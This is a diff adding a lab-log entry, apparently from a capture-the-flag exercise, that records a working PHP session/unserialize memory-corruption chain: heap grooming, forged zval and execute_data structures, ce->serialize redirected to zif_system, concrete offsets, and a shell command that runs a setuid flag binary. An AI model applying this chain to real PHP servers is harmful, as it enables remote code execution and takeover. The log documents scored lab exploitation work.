@@ -460,3 +460,67 @@ NEXT RUNG: RCE dispatch with known base: forge the serialize object path
 (rebuild24: zif_system @ 0x4248d0 — target offset TBD via byte-pattern
 match, same validation as tmp_var 0x47fc20) => system("/usr/local/bin/
 print-flag") output through the writeback, in-band HTTP only.
+
+## SMB1 attempt-10 — 🏆🏆 RCE COMPLETE: zif_system dispatch, WIN SCORED (mode=exec)
+
+tools: scripts/smb_rce1.py (win chain), scored as
+results/scored/smb-vuln-2026-10-26T00:46:06Z (anti_echo=verified).
+
+### The dispatch (serialize-side; the destroy-gate is engine-closed)
+var_destroy (the __wakeup/__unserialize delayed calls) NEVER runs on this
+surface: all post-remnant decodes nest at BG(unserialize).level>=2, and
+the level==1 gate can only open on a fresh (non-groomed) php_unserialize_
+data; serialize_lock-held decodes allocate FRESH d with BG untouched.
+=> the reachable call-with-our-zval surface is php_var_serialize_intern's
+object case:  ce->serialize(struc, &serialized_data, &serialized_length,
+var_hash)  — 4-arg call, x1/x2 are REAL STACK addresses (retval write is
+safe), checked BEFORE the __sleep/function_table/handlers paths, and a
+non-SUCCESS return falls to the clean "N;" branch (serialize continues).
+
+### The forge (all offsets source-verified in the rebuild24 tree)
+- session `x|R:3;y|R:4;` (14B, established-bin law; R-roots push nothing).
+  - x: R:3 -> entries data[2] -> FAKE IS_REFERENCE zval {value=REF,
+    0x10a} (ZVAL_COPY skips NEW_REF; x = ref copy; serialize derefs to
+    &REF.val = groom-known address, so the fake-execute_data reads land
+    in OUR bytes).
+  - y: R:4 -> data[3] -> fake zval {d+0x10, IS_STRING_EX} = the attempt-9
+    base-leak echo (real HT at d+0x0 read header; in-band, same request).
+- execute_data = &REF.val: num_args@+0x2C=1, arg1@+0x50 = {CMD
+  zend_string, IS_STRING_EX}; ce->serialize = zif_system (ZPP sees 1
+  string arg = the command); ce_fields=0, __serialize=NULL.
+- obj/ce/ref all in the groom; entries data[i] slots are 8-byte zval*.
+- zif_system TARGET offset 0x4238b0, php_exec_ex 0x423500 (32B byte-
+  pattern matches in the target binary, offset==vaddr in LOAD1; the
+  target is PIE DYN; "base" = r-xp segment start as in all prior runs).
+
+### The carve law (why the first attempts crashed)
+The 0x40-class bin carve over page0 writes chain ptrs at every
+[0x40k, +8) and shadow-encoded ptrs at [0x40k+0x38, +0x40) — 16 bad
+bytes per 64 — BUT ONLY ON PAGE 0 (one bin page), and only AFTER the
+decode (the groom header survives decode-time; the mystery HT at d+0x0
+lands at writeback time). => all fake structures live on PAGE 1
+(groom size 5120, still single-read <=5120 legal).
+Also: zend_string layout gc(8) h@+8 len@+0x10 val@+0x18 (off-by-8 cost
+one debug round); entries data[i] stride is 8 bytes (zval*), NOT 16.
+
+### The win chain (scripts/smb_rce1.py, two HTTP requests)
+1. RCE request: producer remnant {d,1} -> groom -> writeback encode of
+   x -> ce->serialize = zif_system(execute_data=&REF.val, retval=&sd) ->
+   ZPP ok (num_args=1, arg=our string) -> strlen null-byte check passes
+   -> php_exec -> VCWD_POPEN -> sh runs:
+   /usr/local/bin/print-flag|sed 's/.*/x|s:50:"\&";/'|tr -d '\n'
+     >/tmp/sess_<sid2>
+   (print-flag is setuid root; flag is 50 bytes + \n, sed formats it as a
+   VALID session value x|s:50:"FLAG{...}";). Request 502s afterward
+   (post-dispatch VM crash in the multipart machinery — the mystery
+   FETCH_OBJ_RW SEGV — irrelevant: execution already happened).
+2. Plain multipart request with PHPSESSID=<sid2> (no producer, no
+   groom): php session-decodes the exec-written file, x = the flag
+   string, and the FILE-DATA update's session WRITEBACK re-encodes it:
+   x|s:50:"FLAG{wallet:vuln:...}";  — the flag echoed in-band through
+   the app's own session channel. 200 OK, no crash.
+VERIFIED: /tmp/zz side-effect test (print-flag output in container),
+in-band y-leak (pDestructor=base+0x63052c) in the same RCE request,
+ctrl :8152 clean (200) throughout.
+score.sh smb-vuln results/smb-rce1-evidence.txt --request ... --mode exec
+=> SCORED, anti_echo=verified (flag not in request capture).
